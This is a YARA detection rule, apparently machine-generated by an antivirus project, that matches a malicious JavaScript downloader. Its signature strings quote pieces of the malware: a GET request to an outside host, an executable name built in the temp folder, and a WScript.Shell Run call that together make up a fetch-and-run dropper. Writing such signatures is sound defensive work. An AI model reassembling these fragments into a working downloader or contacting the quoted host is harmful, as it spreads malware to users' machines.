rule sig_20160329_302b18e26a96ae908d07233fa6bd0269 {
  meta:
    description = "datamaliciousorder - file 20160329_302b18e26a96ae908d07233fa6bd0269.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6bec7d0e9d37dc412eabbc8c0d19545785307a93487aeb026f9c27fab9d2e86"

  strings:
    $s1  = "function Qjbyx() {return Zjpwefmo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"dDt71UBgnTCeOsM.exe\";};" fullword ascii
    $s2  = "Ovxlfhtnwe[Ugaplxmrs](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Rhzjxwfc](Zvqsvastxo() * 11)} while (Ovxlfhtnwe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zjpwefmo = function Asiijzp() {return WScript[Fhiqzy](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Kpbzczngy(Eatjlubxh, Cwpncmwnk){return Eatjlubxh - Cwpncmwnk;};" fullword ascii
    $s6  = "function Ejbtmqm() {return ((Rmaefmk == true) && (Rmaefmk == Wwqliyx)) ? 1 : Ctyvqlxhu;};" fullword ascii
    $s7  = "function Roncxsxh(Abybn){Zjpwefmo[\"Run\"](Abybn, Ctyvqlxhu, Ctyvqlxhu);};" fullword ascii
    $s8  = " while (Biceqru){" fullword ascii
    $s9  = "function Zvqsvastxo(){return 22;};" fullword ascii
    $s10 = "var Viorsmerhu = false;" fullword ascii
    $s11 = "function Tgotlaugo(){return Fhiqzy;};" fullword ascii
    $s12 = "function Obmahiuuq()" fullword ascii
    $s13 = "return Kpbzczngy(Zqoaypkix, Piwowy);" fullword ascii
    $s14 = "function Flgjvwznc(Xnekdourl) {var Ivahgxve = (1, 2, 3, 4, 5, Xnekdourl); return Ivahgxve;};" fullword ascii
    $s15 = "Wwqliyx = true; " fullword ascii
    $s16 = "var Wwqliyx = false;" fullword ascii
    $s17 = "var Jcmci = new this[\"Date\"]();" fullword ascii
    $s18 = "var Rmaefmk = false;" fullword ascii
    $s19 = "function Lqahkcqi(){return Prbusgr;};" fullword ascii
    $s20 = "Rmaefmk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}